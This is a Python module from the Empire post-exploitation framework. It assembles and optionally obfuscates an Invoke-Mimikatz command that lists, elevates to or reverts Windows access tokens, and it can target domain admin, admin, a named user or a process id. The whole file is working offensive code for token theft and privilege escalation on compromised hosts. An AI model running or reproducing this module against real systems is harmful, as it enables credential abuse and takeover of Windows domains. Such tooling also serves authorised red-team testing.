from __future__ import print_function

import pathlib
from builtins import object, str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: PydanticModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        list_tokens = params["list"]
        elevate = params["elevate"]
        revert = params["revert"]
        admin = params["admin"]
        domainadmin = params["domainadmin"]
        user = params["user"]
        processid = params["id"]

        script_end = "Invoke-Mimikatz -Command "

        if revert.lower() == "true":
            script_end += "'\"token::revert"
        else:
            if list_tokens.lower() == "true":
                script_end += "'\"token::list"
            elif elevate.lower() == "true":
                script_end += "'\"token::elevate"
            else:
                return handle_error_message(
                    "[!] list, elevate, or revert must be specified!"
                )

            if domainadmin.lower() == "true":
                script_end += " /domainadmin"
            elif admin.lower() == "true":
                script_end += " /admin"
            elif user.lower() != "":
                script_end += " /user:" + str(user)
            elif processid.lower() != "":
                script_end += " /id:" + str(processid)

        script_end += "\"';"

        script = main_menu.modules.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
